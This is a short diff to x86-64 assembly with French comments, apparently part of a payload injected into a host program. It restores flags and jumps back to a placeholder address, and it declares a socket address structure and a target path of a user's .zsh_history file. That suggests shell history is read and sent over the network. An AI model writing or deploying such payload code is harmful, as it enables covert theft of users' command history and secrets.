@@ -92,6 +92,7 @@ exit:
 	popfq
 	jmp 0x0
 
+section .data
 stat_buffer	times 144 db 0	; Taille de struct stat sur x86-64
 sockaddr_in:
 	; - sin_family: 2 octets
@@ -105,4 +106,4 @@ sockaddr_in:
 	; Taille totale: 16 octets
 ; path		times 1024 db 0	; Chemin du fichier
 path		db '/home/maxence/.zsh_history', 0	; Chemin du fichier
-_payload_size dq $- _payload
+; _payload_size dq $- _payload
